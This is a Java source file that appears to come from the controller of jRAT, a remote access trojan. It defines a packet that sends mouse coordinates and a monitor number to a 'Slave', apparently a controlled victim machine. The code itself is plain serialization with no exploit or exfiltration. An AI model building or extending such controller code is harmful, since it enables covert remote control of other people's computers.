package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet91MouseMove implements OutgoingPacket {

	private int x;
	private int y;
	private int monitor;

	public Packet91MouseMove(int x, int y, int monitor) {
		this.x = x;
		this.y = y;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(x);
		slave.writeInt(y);
		slave.writeInt(monitor);
	}

	@Override
	public short getPacketId() {
		return 91;
	}

}
